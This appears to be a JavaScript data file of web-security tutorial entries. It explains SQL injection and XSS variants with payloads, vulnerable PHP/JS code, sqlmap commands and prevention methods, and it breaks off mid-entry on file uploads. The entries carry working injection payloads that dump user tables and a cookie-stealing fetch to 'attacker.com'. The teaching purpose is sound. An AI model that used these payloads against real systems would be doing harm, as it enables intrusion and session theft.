const allVulnerabilities = [
    
 {
    "id": 1,
    "title": "local cach",
    "summary": `
SQL Injection Authentication Bypass ,
Blind SQL Injection , 
Union Based SQL Injection ,
Time-Based Blind SQL Injection ,
Error-Based SQL Injection ,
Cross Site Scripting XSS Reflected ,
Stored XSS داخل التعليقات ,
DOM Based XSS في JavaScript ,
File Upload Vulnerability ,
Remote File Inclusion RFI ,
Local File Inclusion LFI , 
Directory Traversal Attack ,
Command Injection في Linux ,
OS Command Injection في Windows ,
Broken Authentication Vulnerability ,
Weak Password Attack ,
Brute Force Login Attack ,
Session Hijacking باستخدام Cookies ,
Insecure Direct Object Reference IDOR ,
Broken Access Control ,
JWT Token Manipulation ,
JWT None Algorithm Exploit ,
Server Side Request Forgery SSRF ,
XML External Entity XXE ,`
 },

 {
    "id": 2,
    "title": "",
    "summary": `Insecure Deserialization Attack ,
CSRF Account Takeover ,
Clickjacking Attack ,
Open Redirect Vulnerability ,
HTTP Host Header Injection ,
Subdomain Takeover ,
SSTI Server Side Template Injection ,
Prototype Pollution في JavaScript ,
Path Traversal في APIs ,
API Rate Limit Bypass ,
NoSQL Injection في MongoDB ,
LDAP Injection Attack , 
XPath Injection Vulnerability ,
Buffer Overflow Basics ,
Stack Buffer Overflow ,
Format String Vulnerability ,
Race Condition Exploit ,
Integer Overflow Vulnerability ,
Memory Corruption Basics ,
Reverse Shell Upload Attack ,
Web Shell Upload Vulnerability ,
Privilege Escalation في Linux ,
Linux Sudo Misconfiguration ,
SUID Binary Exploitation ,
Cron Job Privilege Escalation ,
PATH Hijacking في Linux ,
Kernel Exploitation Basics ,
Windows Privilege Escalation ,
Unquoted Service Path Vulnerability ,
DLL Hijacking في Windows ,
AlwaysInstallElevated Exploit ,
SMB Enumeration Attack ,
SMB Relay Attack ,
NTLM Hash Capture ,
Pass The Hash Attack ,
Kerberoasting في Active Directory ,
AS-REP Roasting Attack ,
Active Directory Enumeration ,
Golden Ticket Attack ,
Silver Ticket Attack ,
BloodHound Privilege Mapping ,
WiFi WPA2 Handshake Capture ,
Evil Twin WiFi Attack ,
Rogue Access Point Attack ,
DNS Spoofing Attack ,`
 },

 {
    "id": 3,
    "title": "",
    "summary": `ARP Spoofing في الشبكات , 
Man In The Middle Attack ,
Packet Sniffing باستخدام Wireshark ,
FTP Anonymous Login Exploit ,
Telnet Misconfiguration ,
Misconfigured Docker Container ,
Docker Escape Basics , 
Kubernetes Misconfiguration ,
Exposed Git Repository Attack ,
Exposed .env File Vulnerability ,
Firebase Misconfiguration Leak ,
S3 Bucket Misconfiguration ,
Cloud Metadata SSRF Attack ,
GraphQL Introspection Exploit ,
OAuth Token Leakage ,
WebSocket Vulnerability Basics ,
XML Injection Attack ,
CRLF Injection Vulnerability ,
Email Header Injection ,
Insecure File Permissions ,
Source Code Disclosure Vulnerability ,
Backup File Exposure Attack ,
Information Disclosure عبر Debug Mode ,
WordPress Plugin Exploitation ,
Joomla Component Exploitation ,
Drupal Module Vulnerability ,
Apache Misconfiguration Attack ,
Nginx Alias Traversal Vulnerability ,
Redis Unauthorized Access ,
Elasticsearch Open Database Exposure ,
Jenkins Remote Code Execution ,
`
 },

 {
    "id": 4,
    "title": "SQL Injection Authentication Bypass",
    "summary": `
        <p>The <b>SQL Injection Authentication Bypass</b> vulnerability is considered one of the most dangerous types of database injections. It allows an attacker to bypass the login page and access user accounts or the admin panel without knowing the actual password.</p>

        <p>This vulnerability occurs when an application builds SQL queries based directly on user input without proper sanitization or the use of safe queries (Prepared Statements).</p>

        <h3>How does the login mechanism usually work?</h3>

        <p>In most websites, the user is verified via a SQL query similar to the following:</p>

        <pre><code>SELECT * FROM users 
WHERE username = 'admin' 
AND password = '123456';</code></pre>

        <p>If the data matches the database, access is granted.</p>

        <h3>Security Issue:</h3>

        <p>If the application places user input directly into the query without protection, the attacker can modify the entire logic of the query.</p>

        <h3>Practical Example of Login Bypass:</h3>

        <p>The attacker enters the following value into the username field:</p>

        <pre><code>' OR '1'='1</code></pre>

        <p>And puts any value in the password field.</p>

        <p>The final query becomes:</p>

        <pre><code>SELECT * FROM users 
WHERE username = '' OR '1'='1' 
AND password = 'test';</code></pre>

        <p>Since the condition <code>'1'='1'</code> is always TRUE, the system may consider the verification successful and allow access without a valid password.</p>

        <h3>Common Payloads:</h3>

        <pre><code>' OR 1=1--
' OR '1'='1'--
admin' --
' OR ''='
" OR "1"="1
admin') OR ('1'='1</code></pre>

        <p>The <code>--</code> character is used in SQL to comment out the rest of the query, so the password condition is ignored.</p>

        <h3>Vulnerable Code Example:</h3>

        <pre><code>// PHP Example

$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users 
WHERE username='$username' 
AND password='$password'";

$result = mysqli_query($conn, $query);</code></pre>

        <p>The problem here is that the application merges user input directly into the query.</p>

        <h3>How does a tester detect this vulnerability?</h3>

        <p>The tester sends special characters into the login fields and monitors the application's behavior:</p>

        <pre><code>'
"
--
#</code></pre>

        <p>If SQL errors appear or authentication is bypassed, it means the system is vulnerable to injection.</p>

        <h3>Practical Test using Burp Suite:</h3>

        <pre><code>POST /login HTTP/1.1
Host: vulnerable-site.com

username=admin'--&password=test</code></pre>

        <p>If the login is successful, it indicates an Authentication Bypass vulnerability.</p>

        <h3>Damages resulting from the vulnerability:</h3>

        <p>1. Accessing user accounts without a password.</p>
        <p>2. Accessing the admin panel.</p>
        <p>3. Stealing sensitive data.</p>
        <p>4. Full control over the database.</p>
        <p>5. Deleting or modifying user information.</p>

        <h3>Correct Protection Methods:</h3>

        <p><b>1. Using Prepared Statements:</b></p>

        <pre><code>// Secure PHP PDO Example

$stmt = $pdo->prepare(
"SELECT * FROM users 
WHERE username = ? 
AND password = ?"
);

$stmt->execute([$username, $password]);</code></pre>

        <p><b>2. Sanitizing and validating user input.</b></p>

        <p><b>3. Not displaying SQL error messages to the user.</b></p>

        <p><b>4. Using modern ORM Frameworks.</b></p>

        <p><b>5. Applying the principle of least privilege to the database account.</b></p>

        <h3>Signs indicating the presence of SQL Injection:</h3>

        <pre><code>SQL syntax error
mysql_fetch
ORA-01756
Unclosed quotation mark
PDOException</code></pre>

        <p>The appearance of these messages often means that the application is handling user input in an unsafe manner.</p>

        <h3>Important Notes:</h3>

        <p>Although the Authentication Bypass vulnerability is considered one of the oldest vulnerabilities, it is still one of the most prevalent due to poor login system programming.</p>

        <p>Additionally, many Bug Bounty tests start by checking login fields to discover this type of vulnerability.</p>
    `
},

{
    "id": 5,
    "title": "Union Based SQL Injection",
    "summary": `
        <p><b>Union Based SQL Injection</b> is one of the most powerful database injection techniques. It relies on exploiting the <code>UNION SELECT</code> statement to combine the results of an attacker's query with the results of the original query executed by the application, allowing sensitive data to be displayed directly on the website page.</p>

        <h3>Why is this vulnerability dangerous?</h3>
        <p>It allows an attacker to extract sensitive data directly without needing to guess information, such as:</p>
        <ul>
            <li>Usernames and passwords.</li>
            <li>Email addresses and contact information.</li>
            <li>Database structure (table and column names).</li>
            <li>Database version and system information.</li>
        </ul>

        

        <h3>How the UNION statement works:</h3>
        <p>The <code>UNION</code> operator is used to combine the result sets of two or more <code>SELECT</code> statements into a single result set. For this to succeed, both queries must have the same number of columns.</p>
        <pre><code>SELECT column1 FROM table1
UNION
SELECT column2 FROM table2;</code></pre>

        <h3>Steps to Detect and Exploit:</h3>
        
        <p><b>1. Determine the number of columns:</b> You must find the number of columns in the original query. This is done using <code>ORDER BY</code>:</p>
        <pre><code>1' ORDER BY 1--
1' ORDER BY 2--
// Continue until an SQL error appears</code></pre>
        <p>Alternatively, use <code>NULL</code> values:</p>
        <pre><code>1' UNION SELECT NULL, NULL, NULL--</code></pre>

        <p><b>2. Identify displayable columns:</b> To see which column's data is reflected on the page:</p>
        <pre><code>1' UNION SELECT 1, 2, 3--</code></pre>
        <p>If the number "2" appears on the page, the second column is the correct path to display retrieved data.</p>

        <p><b>3. Data Extraction:</b></p>
        <ul>
            <li><b>Database Name:</b> <code>1' UNION SELECT database(), 2--</code></li>
            <li><b>Table Names:</b> <code>1' UNION SELECT table_name, 2 FROM information_schema.tables--</code></li>
            <li><b>Column Names:</b> <code>1' UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='users'--</code></li>
            <li><b>Dumping Data:</b> <code>1' UNION SELECT username, password FROM users--</code></li>
        </ul>

        <h3>Practical Exploitation:</h3>
        <p><b>Via URL:</b></p>
        <pre><code>http://target.com/product.php?id=1'+UNION+SELECT+username,password+FROM+users--</code></pre>
        
        <p><b>Using Tools:</b> <b>SQLMap</b> is the most effective tool to automate this process:</p>
        <pre><code>sqlmap -u "http://target.com/product.php?id=1" --dbs
sqlmap -u "http://target.com/product.php?id=1" -D database_name -T users --dump</code></pre>

        <h3>Prevention Methods:</h3>
        <p>The definitive solution is to separate user input from the query logic:</p>
        <ol>
            <li><b>Use Prepared Statements (with Parameterized Queries):</b> This is the most critical defense against SQL injection.</li>
            <li><b>Strict Input Validation:</b> Ensure the data entered matches the expected type (e.g., verifying that an ID is purely numeric).</li>
            <li><b>Disable Database Error Reporting:</b> Never display raw SQL errors to the end-user to prevent system information leakage.</li>
            <li><b>Principle of Least Privilege:</b> Ensure the database account used by the application has only the minimum permissions necessary for its function.</li>
        </ol>

        <h3>Signs of Vulnerability:</h3>
        <ul>
            <li>SQL errors appearing when using special characters (', ", --, #).</li>
            <li>Unexpected changes in page content after injecting <code>UNION SELECT</code>.</li>
            <li>Error messages such as <code>Column count doesn't match</code> or <code>SQL syntax error</code>.</li>
        </ul>
    `
},

{
    "id": 6,
    "title": "Time-Based Blind SQL Injection",
    "summary": `
        <p><b>Time-Based Blind SQL Injection</b> is one of the most critical forms of "Blind" SQL injection. In this technique, the attacker does not see direct query results or error messages; instead, they infer information by observing the time the server takes to respond to their requests.</p>

        <p>Because the application does not return data directly, the attacker sends queries designed to force a time delay. If the server takes the specified amount of time to respond, the attacker confirms that the injected condition was TRUE.</p>

        <h3>How it works:</h3>
        <p>The attacker injects commands that force the database to "sleep" or pause for a specific duration. By measuring how long the page takes to load, they can confirm whether their injected logic was executed by the database.</p>
        
        

        <h3>Example of a Vulnerable Login Query:</h3>
        <pre><code>SELECT * FROM users 
WHERE username = 'admin' 
AND password = '123456';</code></pre>

        <h3>Practical Testing Example:</h3>
        <p>The attacker injects a sleep command into the username field:</p>
        <pre><code>admin' AND SLEEP(5)--</code></pre>
        <p>If the page takes 5 seconds to respond, the vulnerability is confirmed.</p>

        <h3>Database-Specific Delay Commands:</h3>
        <ul>
            <li><b>MySQL:</b> <code>SLEEP(5)</code></li>
            <li><b>Microsoft SQL Server:</b> <code>WAITFOR DELAY '0:0:5'</code></li>
            <li><b>PostgreSQL:</b> <code>pg_sleep(5)</code></li>
            <li><b>Oracle:</b> <code>DBMS_PIPE.RECEIVE_MESSAGE(('A'),5)</code></li>
        </ul>

        <h3>Testing Logic (TRUE vs. FALSE):</h3>
        <p>To confirm the vulnerability, the attacker tests both conditions:</p>
        <pre><code>// TRUE condition (Page delays)
admin' AND SLEEP(5)--

// FALSE condition (Page loads instantly)
admin' AND 1=2 AND SLEEP(5)--</code></pre>

        <h3>Extracting Data Character by Character:</h3>
        <p>Attackers can automate the extraction of data by testing one character at a time:</p>
        <pre><code>admin' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--</code></pre>
        <p>If the response is delayed, the first character of the database name is 'a'.</p>

        <h3>Practical Exploitation with Tools:</h3>
        <p><b>Burp Suite:</b> Monitor the "Response Time" column in the Burp Repeater to observe the intentional delays.</p>
        <p><b>SQLMap:</b> Automate the process using the time-based technique flag:</p>
        <pre><code>sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --technique=T</code></pre>

        <h3>Prevention Methods:</h3>
        <p>To secure your application, you must prevent the query logic from being manipulated:</p>
        <ol>
            <li><b>Use Prepared Statements:</b> This is the most effective way to prevent all SQL injection types.</li>
            <li><b>Strict Input Validation:</b> Ensure inputs match the expected data format (e.g., numeric IDs).</li>
            <li><b>Hide Detailed Error Messages:</b> Ensure the application does not leak system information.</li>
            <li><b>Limit Query Execution Time:</b> Configure the database and web server to prevent long-running queries from lingering.</li>
            <li><b>Deploy a Web Application Firewall (WAF):</b> Detect and block common injection patterns.</li>
        </ol>

        <h3>Criticality:</h3>
        <p>While Time-Based SQLi is slower than other methods because it requires extracting data bit-by-bit, it is extremely dangerous because it succeeds even when the application is fully hardened against visible error messages or direct data leakage.</p>
    `
},

{
    "id": 7,
    "title": "Error-Based SQL Injection",
    "summary": `
        <p><b>Error-Based SQL Injection</b> is a technique where an attacker deliberately triggers database errors to force the application to reveal sensitive information within the error message itself.</p>

        <p>Instead of receiving data directly from the query, the attacker manipulates the input to force a syntax or processing error, which the database engine returns to the user, exposing details like database versions, table names, or file paths.</p>

        

        <h3>How it Works:</h3>
        <p>Applications are often configured to show detailed database error messages to users for debugging purposes. An attacker exploits this by injecting SQL functions that intentionally cause errors when they process dynamic data.</p>

        <h3>Practical Detection Example:</h3>
        <p>By adding a single quote (<code>'</code>) to a URL parameter, the application might leak an error:</p>
        <pre><code>http://target.com/product.php?id=1'</code></pre>
        <p>If a message like <code>"You have an error in your SQL syntax..."</code> appears, the application is likely vulnerable.</p>

        <h3>Common Exploitation Functions (MySQL):</h3>
        <p>Attackers use functions that evaluate and return data within an error message when they fail:</p>
        <ul>
            <li><b>extractvalue():</b> Often used to trigger XPath syntax errors that contain the injected data.</li>
            <li><b>updatexml():</b> Similar to <code>extractvalue()</code>, it causes errors when the input does not match expected XML structure.</li>
            <li><b>floor(rand()):</b> Used in group-by clauses to trigger duplicate key errors containing sensitive data.</li>
        </ul>

        <h3>Extraction Example (Database Version):</h3>
        <pre><code>1' AND extractvalue(1,concat(0x7e,version()))--</code></pre>
        <p><b>Resulting Error:</b> <code>XPATH syntax error: '~8.0.36'</code></p>

        <h3>Data Extraction Chain:</h3>
        <ul>
            <li><b>Database Name:</b> <code>1' AND extractvalue(1,concat(0x7e,database()))--</code></li>
            <li><b>Table Names:</b> <code>1' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 0,1)))--</code></li>
        </ul>

        <h3>Automation with SQLMap:</h3>
        <pre><code>sqlmap -u "http://target.com/product.php?id=1" --technique=E</code></pre>
        <p>The <code>--technique=E</code> flag forces SQLMap to focus specifically on Error-Based exploitation.</p>

        <h3>Prevention Methods:</h3>
        <p>Securing the application requires restricting the feedback provided to the user:</p>
        <ol>
            <li><b>Use Prepared Statements:</b> Always use parameterized queries to prevent input from being interpreted as code.</li>
            <li><b>Disable Verbose Error Messages:</b> Configure the production environment to hide SQL errors from users.</li>
            <li><b>Internal Logging:</b> Log all database errors to secure, internal files for developer review only.</li>
            <li><b>Input Sanitization:</b> Validate that inputs conform to expected formats (e.g., integer-only for IDs).</li>
            <li><b>Web Application Firewall (WAF):</b> Detect and filter malicious payloads before they reach the database.</li>
        </ol>

        <h3>Criticality:</h3>
        <p>Error-Based SQLi is highly dangerous because it provides a direct, low-effort communication channel for the attacker to query the database structure and content, making it a primary reconnaissance method for deeper system exploitation.</p>
    `
},

{
    "id": 8,
    "title": "Cross Site Scripting (XSS) Reflected",
    "summary": `
        <p><b>Reflected Cross-Site Scripting (Reflected XSS)</b> is one of the most common web application vulnerabilities. It occurs when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way (without proper validation or output encoding).</p>

        

        <p>This vulnerability allows an attacker to inject malicious JavaScript, which executes in the victim's browser when they click a crafted link or submit a malicious request.</p>

        <h3>How it Works:</h3>
        <p>The application takes a value from the user and reflects it directly onto the page. For example, in a search function:</p>
        <pre><code>http://target.com/search?q=phone</code></pre>
        <p>The application returns: <code>You searched for: phone</code>. If the application does not filter the <code>q</code> parameter, an attacker can inject a script instead of plain text.</p>

        <h3>Practical Exploitation:</h3>
        <pre><code>http://target.com/search?q=&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
        <p>If vulnerable, the script executes within the victim's browser, triggering an alert box.</p>

        <h3>Why is it called "Reflected"?</h3>
        <p>Because the malicious script is not stored on the server (like in Stored XSS). Instead, it is "reflected" back from the web server to the victim's browser as part of the immediate HTTP response.</p>

        <h3>Common Attack Payloads:</h3>
        <pre><code>&lt;script&gt;alert(document.domain)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>Impacts:</h3>
        <ul>
            <li><b>Session Hijacking:</b> Stealing cookies via <code>document.cookie</code> (unless <code>HttpOnly</code> is set).</li>
            <li><b>Phishing:</b> Injecting fake login forms into the page.</li>
            <li><b>Unauthorized Actions:</b> Using the victim's session to perform actions, such as changing passwords or updating account details.</li>
        </ul>

        <h3>Automation and Detection:</h3>
        <p>Tools like <b>Burp Suite</b>, <b>XSStrike</b>, <b>Dalfox</b>, and <b>OWASP ZAP</b> are commonly used to detect where input is being reflected unsafely.</p>

        <h3>Prevention Methods:</h3>
        <p>To defend against Reflected XSS, developers must follow these secure coding practices:</p>
        <ol>
            <li><b>Output Encoding:</b> Convert special characters into their HTML entity equivalents (e.g., using <code>htmlspecialchars()</code> in PHP) before rendering them in the browser.</li>
            <li><b>Content Security Policy (CSP):</b> Implement a strict CSP to restrict the sources from which scripts can be loaded and executed.</li>
            <li><b>Use HttpOnly Cookies:</b> Prevents JavaScript from accessing sensitive session cookies.</li>
            <li><b>Input Validation:</b> Ensure that input conforms to expected formats (e.g., allowing only alphanumeric characters for search queries).</li>
            <li><b>Modern Frameworks:</b> Use frameworks like React, Angular, or Vue, which handle output encoding automatically by default.</li>
        </ol>

        <h3>Differences Between XSS Types:</h3>
        <ul>
            <li><b>Reflected XSS:</b> The payload is part of the request and reflected in the immediate response.</li>
            <li><b>Stored XSS:</b> The payload is saved to the database (e.g., in a comment or profile field) and served to all users.</li>
            <li><b>DOM-based XSS:</b> The vulnerability exists entirely in client-side code, where the script is executed by the browser's DOM manipulation.</li>
        </ul>
    `
},

{
    "id": 9,
    "title": "Stored Cross-Site Scripting (Stored XSS)",
    "summary": `
        <p><b>Stored Cross-Site Scripting (Stored XSS)</b>, also known as Persistent XSS, is one of the most dangerous XSS variants. Unlike Reflected XSS, the malicious script is permanently stored on the target server (e.g., in a database, forum post, or comment field). As a result, the payload executes automatically every time a victim views the affected page.</p>

        

        <h3>How it Works:</h3>
        <p>The application accepts input from a user and saves it to a database without proper sanitization or encoding. When other users (or administrators) subsequently view that content, the application serves the malicious script to their browsers, which then execute it within the context of the site.</p>

        <h3>Example of a Vulnerable Comment System:</h3>
        <pre><code>// PHP Example - Vulnerable
$comment = $_POST['comment'];
$query = "INSERT INTO comments (comment) VALUES ('$comment')";
mysqli_query($conn, $query);

// Rendering the comment later
echo $row['comment'];</code></pre>
        <p>Since the comment is echoed directly without encoding, any <code>&lt;script&gt;</code> tag injected by an attacker will be rendered as executable code by the browser.</p>

        <h3>Why Stored XSS is More Dangerous:</h3>
        <ul>
            <li><b>Automatic Execution:</b> It requires no social engineering to trick a user into clicking a link; the attack triggers simply by visiting the page.</li>
            <li><b>Scale:</b> A single injected payload can affect thousands of users, including site administrators.</li>
            <li><b>Persistence:</b> The script remains active until it is manually removed from the database.</li>
        </ul>

        <h3>Common Payloads:</h3>
        <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
&lt;img src=x onerror=alert(1)&gt;
&lt;svg onload=alert(1)&gt;
&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>Impacts:</h3>
        <ul>
            <li><b>Session Hijacking:</b> Stealing cookies to take over user accounts.</li>
            <li><b>Administrative Compromise:</b> If an admin views the malicious comment, the script can perform administrative actions (e.g., creating new admin users, changing settings).</li>
            <li><b>Credential Phishing:</b> Modifying the DOM to display fake login forms to capture passwords.</li>
            <li><b>Malicious Redirects:</b> Forcing users to navigate to malicious or phishing sites.</li>
        </ul>

        <h3>Detection & Automation:</h3>
        <p>Use tools like <b>Burp Suite</b> to intercept the POST request, <b>XSStrike</b> for payload testing, or <b>Dalfox</b> to automate finding stored injection points.</p>

        <h3>Prevention Methods:</h3>
        <ol>
            <li><b>Output Encoding (Primary Defense):</b> Always encode user-supplied data before rendering it in the browser (e.g., use <code>htmlspecialchars()</code> in PHP or template engines like Twig/Jinja2 that auto-escape).</li>
            <li><b>Input Sanitization:</b> Use battle-tested libraries like <b>DOMPurify</b> to strip out malicious HTML/JS while keeping safe formatting.</li>
            <li><b>Content Security Policy (CSP):</b> Implement a strict CSP to block inline scripts and restrict the domains from which scripts can be loaded.</li>
            <li><b>HttpOnly Cookies:</b> Prevents client-side scripts from accessing session cookies, mitigating the risk of session hijacking.</li>
            <li><b>Avoid Inline JavaScript:</b> Never use <code>onclick</code>, <code>onerror</code>, or <code>onmouseover</code> attributes in HTML.</li>
        </ol>

        <h3>Summary of XSS Types:</h3>
        <ul>
            <li><b>Reflected XSS:</b> Payload is part of the request, reflected immediately.</li>
            <li><b>Stored XSS:</b> Payload is stored on the server, served to multiple users.</li>
            <li><b>DOM-based XSS:</b> Vulnerability is entirely in client-side code execution.</li>
        </ul>
    `
},

{
    "id": 10,
    "title": "DOM-Based Cross-Site Scripting (DOM XSS)",
    "summary": `
        <p><b>DOM-Based XSS</b> is a unique type of XSS vulnerability that occurs entirely on the client side. Unlike Reflected or Stored XSS, the server is not involved in the injection; the vulnerability exists in the JavaScript code that processes data from the DOM (Document Object Model) in an unsafe manner.</p>

        

        <h3>The Core Concept:</h3>
        <p>In DOM XSS, an application contains client-side JavaScript that processes data from an untrusted <b>Source</b> (like the URL fragment or query string) and passes it to an unsafe <b>Sink</b> (a function or DOM object that can execute or render code).</p>

        <h3>Sources vs. Sinks:</h3>
        <ul>
            <li><b>Sources:</b> JavaScript properties that the attacker can control (e.g., <code>location.search</code>, <code>location.hash</code>, <code>document.referrer</code>).</li>
            <li><b>Sinks:</b> Functions that execute code or render HTML (e.g., <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout()</code>).</li>
        </ul>

        <h3>Vulnerable Example:</h3>
        <pre><code>// The script reads data from the URL fragment (Source)
var name = location.hash.substring(1);

// And writes it directly into the page (Sink)
document.getElementById("output").innerHTML = name;</code></pre>
        <p>If an attacker visits: <code>http://target.com/#&lt;img src=x onerror=alert(1)&gt;</code>, the browser executes the script automatically.</p>

        <h3>Why DOM XSS is Unique:</h3>
        <p>Because the malicious payload never reaches the server, it often bypasses traditional Web Application Firewalls (WAFs) that only inspect HTTP requests sent to the server. The entire attack happens within the victim's browser.</p>

        <h3>Common Dangerous Sinks:</h3>
        <ul>
            <li><code>innerHTML</code> / <code>outerHTML</code></li>
            <li><code>document.write()</code></li>
            <li><code>eval()</code></li>
            <li><code>setTimeout()</code> / <code>setInterval()</code> (when passing a string instead of a function)</li>
        </ul>

        <h3>Practical Exploitation Examples:</h3>
        <ul>
            <li><b>Using <code>document.write()</code>:</b> <code>http://target.com/#&lt;svg onload=alert(1)&gt;</code></li>
            <li><b>Using <code>eval()</code>:</b> <code>http://target.com/#alert(document.cookie)</code></li>
        </ul>

        <h3>Detection Techniques:</h3>
        <p>Detecting DOM XSS requires analyzing client-side JavaScript. Modern tools like <b>Burp Suite's DOM Invader</b> specifically instrument the browser to identify data flowing from sources to dangerous sinks.</p>

        <h3>Prevention Methods:</h3>
        <ol>
            <li><b>Use Safe Sinks:</b> Replace dangerous sinks like <code>innerHTML</code> with safe alternatives like <code>textContent</code> or <code>innerText</code>, which treat input as plain text, not HTML.</li>
            <li><b>Sanitize Input:</b> Use trusted libraries like <b>DOMPurify</b> to strip dangerous HTML tags and attributes from any input before it reaches a sink.</li>
            <li><b>Avoid <code>eval()</code>:</b> Never pass untrusted data to <code>eval()</code>, <code>setTimeout()</code>, or <code>setInterval()</code>.</li>
            <li><b>Content Security Policy (CSP):</b> A robust CSP can prevent the execution of unauthorized scripts, significantly reducing the impact of a DOM XSS vulnerability.</li>
            <li><b>Use Modern Frameworks:</b> Frameworks like React or Angular are designed to automatically encode data when rendering, which helps protect against most XSS scenarios.</li>
        </ol>

        <h3>Comparison:</h3>
        <ul>
            <li><b>Reflected XSS:</b> The server receives the payload and reflects it back in the HTTP response.</li>
            <li><b>Stored XSS:</b> The server stores the payload in a database and serves it to users.</li>
            <li><b>DOM XSS:</b> The vulnerability exists entirely in the client-side JavaScript processing; the server never sees the payload.</li>
        </ul>

        <h3>Criticality:</h3>
        <p>DOM XSS is highly dangerous because it is often "invisible" to server-side security controls. As modern web applications rely more heavily on client-side logic, DOM XSS has become a primary target for attackers seeking to hijack user sessions or perform actions on behalf of the victim.</p>
    `
},

{
    "id": 11,
    "title": "DOM Based XSS in JavaScript",
    "summary": `
        <p><b>DOM Based XSS</b> is considered one of the most dangerous types of Cross Site Scripting because it happens entirely inside the browser (Client Side) without requiring modification of the server response or storing data inside the database.</p>

        <p>In this type of vulnerability, JavaScript inside the page reads user input from the DOM or from the URL and injects it into the page in an unsafe way, allowing the execution of malicious JavaScript code.</p>

        <h3>What is the DOM?</h3>

        <p>The DOM stands for <b>Document Object Model</b>, which is the structure used by the browser to represent HTML page elements and interact with them through JavaScript.</p>

        <h3>How Does the Vulnerability Occur?</h3>

        <p>The vulnerability occurs when the application uses data that the user can control and places it inside the page using dangerous functions such as:</p>

        <pre><code>innerHTML
document.write()
eval()
setTimeout()
setInterval()</code></pre>

        <h3>Weak Practical Example:</h3>

        <pre><code>// JavaScript Example

var name = location.hash.substring(1);

document.getElementById("output").innerHTML = name;</code></pre>

        <p>The code reads data from the URL and directly inserts it into the page without filtering.</p>

        <h3>Exploitation Example:</h3>

        <pre><code>http://target.com/#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>

        <p>When the link is opened, the JavaScript code will execute inside the browser.</p>

        <h3>Why is DOM XSS Different?</h3>

        <p>In Reflected or Stored XSS, the server is responsible for injecting the data into the page.</p>

        <p>In DOM XSS, the JavaScript inside the browser itself causes the vulnerability.</p>

        <h3>Dangerous Data Sources:</h3>

        <p>The application reads data from locations that the user can control.</p>

        <pre><code>location.href
location.search
location.hash
document.URL
document.referrer
window.name</code></pre>

        <h3>Dangerous Execution Sinks:</h3>

        <pre><code>innerHTML
outerHTML
document.write()
eval()
setTimeout()
setInterval()</code></pre>

        <h3>Example of Dangerous innerHTML Usage:</h3>

        <pre><code>var input = location.search;

document.body.innerHTML = input;</code></pre>

        <p>If the attacker sends the following link:</p>

        <pre><code>http://target.com/?&lt;img src=x onerror=alert(1)&gt;</code></pre>

        <p>The code will execute inside the browser.</p>

        <h3>Example of document.write() Exploitation:</h3>

        <pre><code>document.write(location.hash);</code></pre>

        <p>Malicious link:</p>

        <pre><code>http://target.com/#&lt;svg onload=alert(1)&gt;</code></pre>

        <h3>eval() Exploitation:</h3>

        <pre><code>eval(location.hash.substring(1));</code></pre>

        <p>Link:</p>

        <pre><code>http://target.com/#alert(document.cookie)</code></pre>

        <h3>Cookie Theft:</h3>

        <pre><code>&lt;script&gt;
fetch('http://attacker.com/steal?cookie=' + document.cookie)
&lt;/script&gt;</code></pre>

        <p>If the cookies are not protected with HttpOnly, the attacker will be able to steal them.</p>

        <h3>Performing Actions as the Victim:</h3>

        <pre><code>&lt;script&gt;
fetch('/change-password', {
method:'POST',
body:'password=hacked123'
});
&lt;/script&gt;</code></pre>

        <h3>Testing the Vulnerability Using DevTools:</h3>

        <p>The tester opens the Developer Tools and tracks data sources inside JavaScript.</p>

        <h3>Testing the Vulnerability Using Burp Suite:</h3>

        <pre><code>GET /#&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1
Host: vulnerable-site.com</code></pre>

        <h3>DOM XSS Detection Tools:</h3>

        <pre><code>Burp Suite DOM Invader
DOM XSS Scanner
XSStrike
Dalfox
OWASP ZAP</code></pre>

        <h3>Common Payload Types:</h3>

        <pre><code>&lt;script&gt;alert(1)&lt;/script&gt;

&lt;img src=x onerror=alert(1)&gt;

&lt;svg onload=alert(1)&gt;

javascript:alert(1)

&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;</code></pre>

        <h3>Indicators of DOM XSS:</h3>

        <p>1. Usage of innerHTML or document.write.</p>
        <p>2. Reading data from the URL.</p>
        <p>3. Executing JavaScript without additional interaction.</p>
        <p>4. Lack of filtering or encoding.</p>

        <h3>Example of Safe Code:</h3>

        <pre><code>// Safe Example

var name = location.hash.substring(1);

document.getElementById("output").textContent = name;</code></pre>

        <p>Using <code>textContent</code> prevents the execution of HTML or JavaScript.</p>

        <h3>Correct Protection Methods:</h3>

        <p><b>1. Avoid using innerHTML.</b></p>

        <p><b>2. Use textContent or innerText.</b></p>

        <p><b>3. Prevent the use of eval().</b></p>

        <p><b>4. Filter data coming from the URL.</b></p>

        <p><b>5. Use Content Security Policy (CSP).</b></p>

        <p><b>6. Use Sanitization libraries such as DOMPurify.</b></p>

        <h3>Difference Between XSS Types:</h3>

        <p><b>Reflected XSS:</b> The code comes from the request and is displayed by the server.</p>

        <p><b>Stored XSS:</b> The code is stored inside the database.</p>

        <p><b>DOM XSS:</b> The execution happens entirely inside JavaScript within the browser.</p>

        <h3>Vulnerability Severity:</h3>

        <p>DOM Based XSS allows attackers to steal user sessions, execute actions inside user accounts, modify page content, redirect victims, or create phishing pages within the same website, making it one of the most dangerous modern JavaScript vulnerabilities.</p>
    `
},

{
    "id": 12,
    "title": "File Upload Vulnerability",
    "summary": `
        <p><b>File Upload Vulnerability</b> is one of the most dangerous web application vulnerabilities because it allows attackers to upload malicious files to the server. If the application does not properly validate uploaded files, attackers may execute remote code, gain access to sensitive data, or completely compromise the server.</p>

